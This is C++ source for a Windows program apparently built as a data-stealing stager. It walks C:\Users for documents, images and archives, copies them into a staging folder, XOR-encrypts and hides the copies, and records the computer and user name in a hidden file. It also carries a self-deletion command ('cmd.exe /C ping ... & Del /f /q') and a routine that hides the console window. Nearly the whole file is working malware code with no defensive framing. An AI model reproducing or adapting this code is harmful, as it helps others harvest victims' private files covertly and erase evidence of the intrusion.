#pragma region include
#pragma once
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma warning(disable : 4996)
#pragma comment(lib, "Wtsapi32.lib")
#ifndef _GLIBCXX_NO_ASSERT
#include <cassert>
#endif
#include <algorithm>
#include <bitset>
#include <complex>
#include <deque>
#include <exception>
#include <fstream>
#include <functional>
#include <iomanip>
#include <ios>
#include <iosfwd>
#include <iostream>
#include <istream>
#include <iterator>
#include <limits>
#include <list>
#include <locale>
#include <map>
#include <memory>
#include <new>
#include <numeric>
#include <ostream>
#include <queue>
#include <set>
#include <sstream>
#include <stack>
#include <stdexcept>
#include <streambuf>
#include <string>
#include <typeinfo>
#include <utility>
#include <cmath>
#include <strsafe.h>
#include <io.h>
#include <windows.h>
#include <windowsx.h>
#include <filesystem>
#include <cstdio>
#include <cstdlib>

#define syspause system("pause")
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
static const std::vector<std::string> SEARCH_ERROR(1, "ERROR");
#pragma endregion

#pragma region metarial

static const std::string standard_passcode = "dkdrlahWLTPRTMMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCn"
"CKt0NVH7j5Oh2SGgEU0aqi5u6sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jtQIW"
"mkYIQ8o3FGqMzsMTNxrbAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfUazF"
"Bs99K5xJEppHG0qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4"
"oDlZBv8BM/WxxuOyu0I8bDUDdutJOfREYRZBlHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHjJzGsM";

static const std::vector<std::string> allow_file_list = {
	".zip", ".7z", ".bmp", ".gif", ".jpeg", ".png", ".psd", ".pic", ".jpg", ".raw", ".tiff", ".wma", ".doc", ".docx", ".html", ".htm", ".hwp", ".hwpx", ".pdf", ".txt", ".ppt", ".pptx",
};

#pragma endregion

class toxic {
private:
	inline static bool isFileOrDir(_finddata_t fd) {
		return fd.attrib & _A_SUBDIR ? false : true;
	}

	inline static BOOL DirectoryExists(LPCTSTR szPath) {
		DWORD dwAttrib = GetFileAttributesW(szPath);
		return (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
	}
public:
	static class tstring {
	public:
		inline static std::string& ltrim(std::string& s, const char* t = " \t\n\r\f\v") {
			s.erase(0, s.find_first_not_of(t));
			return s;
		}

		inline static std::string& rtrim(std::string& s, const char* t = " \t\n\r\f\v") {
			s.erase(s.find_last_not_of(t) + 1);
			return s;
		}

		inline static std::string& trim(std::string& s, const char* t = " \t\n\r\f\v") {
			return ltrim(rtrim(s, t), t);
		}

		inline static std::string& strcrypt(std::string& str, std::string cipher = standard_passcode) {
			for (size_t i = 0; i < str.size( ); ++i)
				str[i] ^= cipher[i % cipher.length( )];
			return str;
		}

		inline static std::vector<std::string> strcut(std::string str, std::string _module) {
			char buffer[1024];
			std::strcpy(buffer, str.c_str( ));
			char* ptr = std::strtok(buffer, _module.c_str( ));
			std::vector<std::string> ret;
			while (ptr) {
				ret.push_back(ptr);
				ptr = std::strtok(NULL, _module.c_str( ));
			}
			return ret;
		}
	};

	static class tfile {
	public:
		inline static BOOL Filecrypt(const std::string path) {
			char _buffer[BUFSIZ] = {NULL};

			_iobuf* fp = NULL;
			size_t readBytes = 0, rpos = 0, wpos = 0;
			errno_t err;

			if (err = fopen_s(&fp, path.c_str( ), "r+b") != NULL)
				return EXIT_FAILURE;
			while (!std::feof(fp)) {
				wpos = std::ftell(fp);
				ZeroMemory(_buffer, sizeof(_buffer));

				readBytes = std::fread(_buffer, sizeof(char), sizeof(_buffer), fp);
				if (readBytes <= 0) break;
				rpos = std::ftell(fp);

				for (int i = 0; i < sizeof(_buffer); i++)
					_buffer[i] ^= standard_passcode[i % standard_passcode.length( )];

				std::fseek(fp, wpos, SEEK_SET);
				std::fwrite(_buffer, sizeof(char), readBytes, fp);
				std::fseek(fp, rpos, SEEK_SET);
			}
			std::fclose(fp);
			return EXIT_SUCCESS;
		}

		inline static void SearchingSubFiles(std::string start_path = "", std::vector<std::string> allow = std::vector<std::string>( ), std::function<BOOL(std::string)> processfn = std::function<BOOL(std::string)>( )) {
			typedef struct _finddata_t FILE_SEARCH;
			struct _finddata_t fd;

			intptr_t handle;
			int check = 0;
			char temp[_MAX_PATH];
			char tmp[_MAX_PATH];

			start_path += "\\";
			std::strcpy(temp, start_path.c_str( ));
			start_path += "*";

			std::strcpy(tmp, temp);
			std::strcat(tmp, "*");
			if ((handle = _findfirst(tmp, &fd)) == -1) {
				return;
			} else {
				while (_findnext(handle, &fd) == 0) {
					std::string file_pt = temp;
					file_pt += fd.name;

					check = isFileOrDir(fd);
					if (check == 0 && fd.name[0] != '.') {
						char tmp[_MAX_PATH];
						std::strcpy(tmp, file_pt.c_str( ));
						SearchingSubFiles(tmp, allow, processfn);
					} else if (check == 1 && fd.size != 0 && fd.name[0] != '.') {
						for (const auto& i : allow) {
							if (std::strstr(file_pt.c_str( ), i.c_str( )) && !std::strstr(file_pt.c_str( ), "\\AppData\\")) {
								processfn(file_pt);
							}
						}
					}
				}
				_findclose(handle);
				return;
			}
		}

		inline static void delete_self_( ) {
			wchar_t szModuleName[MAX_PATH];
			wchar_t szCmd[2 * MAX_PATH];

			_STARTUPINFOW si = {0};
			_PROCESS_INFORMATION pi = {0};

			GetModuleFileNameW(NULL, szModuleName, MAX_PATH);
			StringCbPrintfW(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
			CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);

			return;
		}

		inline static std::vector<char> disksearch(void) {
			char disk = 'Z';
			std::vector<char> disk_list;
			do {
				std::string str_buffer;
				str_buffer.push_back(disk); str_buffer.push_back('\\');
				if (DirectoryExists((LPCTSTR)str_buffer.c_str( ))) {
					disk_list.push_back(disk);
				} else {
					--disk;
					continue;
				}
			} while (disk != 'D');
			return disk_list;
		}
	};

	static class tsystem {
	public:
		inline static std::string MachineName( ) {
			char name[MAX_COMPUTERNAME_LENGTH + 1];
			DWORD dwSize = sizeof(name);
			GetComputerNameW((LPWSTR)name, &dwSize);
			std::string ret;
			for (int i = 0; i < sizeof(name); ++i)
				ret.push_back(name[i]);

			return ret;
		}

		inline static std::string UserName( ) {
			char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
			DWORD dwcNameSize = MAX_COMPUTERNAME_LENGTH + 1;
			GetUserName((LPWSTR)szBuffer, &dwcNameSize);
			std::string ret;
			for (int i = 0; i < sizeof(szBuffer); ++i)
				ret.push_back(szBuffer[i]);

			return ret;
		}

		inline static BOOL windowtype(bool show) {
			HWND hWndConsole = GetConsoleWindow( );
			return show ? ShowWindow(hWndConsole, SW_SHOW) : ShowWindow(hWndConsole, SW_HIDE);
		}
	};
};
#define ct crytoxic
#define MAX_BUFFER 1024

inline static std::string str_crypt(std::string str) {
	for (size_t i = 0; i < str.size(); ++i)
		str[i] ^= standard_passcode[i % standard_passcode.length()];
	return str;
}

inline static std::vector<std::string> strcut(std::string str, std::string module_) {
	char buffer[MAX_BUFFER];
	std::strcpy(buffer, str.c_str());
	char* ptr = std::strtok(buffer, module_.c_str());
	std::vector<std::string> ret;
	while (ptr) {
		ret.push_back(ptr);
		ptr = std::strtok(NULL, module_.c_str());
	}
	return ret;
}

extern int cnt = 0;

static std::string machine;
static std::string user;
static std::string integration_path;

inline static BOOL processfunction(std::string abs_path) {
	std::string from_str = abs_path;
	if (integration_path.empty( )) {
		return EXIT_FAILURE;
	}
	std::string to_str = integration_path + std::to_string(cnt++) + "_" + strcut(abs_path, "\\").back();

	char buf[BUFSIZ];
	size_t size;

	_iobuf* source = std::fopen(from_str.c_str(), "rb");
	_iobuf* dest = std::fopen(to_str.c_str(), "wb");

	while (size = std::fread(buf, 1, BUFSIZ, source)) {
		std::fwrite(buf, 1, size, dest);
	}

	std::fclose(source);
	std::fclose(dest);
	toxic::tfile::Filecrypt(to_str);
	SetFileAttributesW((LPCWSTR)to_str.c_str(), FILE_ATTRIBUTE_HIDDEN);
	std::cout << to_str << std::endl;
	return EXIT_SUCCESS;
}

int32_t main(const int argc, const char** argv, const char** env) {
	//toxic::tsystem::windowtype(false);

	std::cout << argv[1] << std::endl;
	system("pause");
	return EXIT_SUCCESS;

	if (argc >= 2) {
		std::cout << "Run Successfully" << std::endl;
		integration_path = argv[1];
	} else {
		std::cout << "Run Failure exiting..." << std::endl;
		std::exit(EXIT_FAILURE);
		return EXIT_FAILURE;
	}

	machine = toxic::tsystem::MachineName( );
	user = toxic::tsystem::UserName( );

	std::string _informationsrmations = "Computer name : [" + machine + "]\nUser name : [" + user + "]";

	std::string file_path = integration_path + "\\target_info.txt";
	FILE* fp = NULL;
	fp = fopen(file_path.c_str(), "w+");
	fputs(_informationsrmations.c_str( ), fp);
	fclose(fp);

	toxic::tfile::Filecrypt(file_path);
	SetFileAttributesW((LPCWSTR)file_path.c_str( ), FILE_ATTRIBUTE_HIDDEN);

	toxic::tfile::SearchingSubFiles(R"(C:\Users)", allow_file_list, processfunction);
	std::cout << "Jobs Finish exiting ..." << std::endl;

	return EXIT_SUCCESS;
}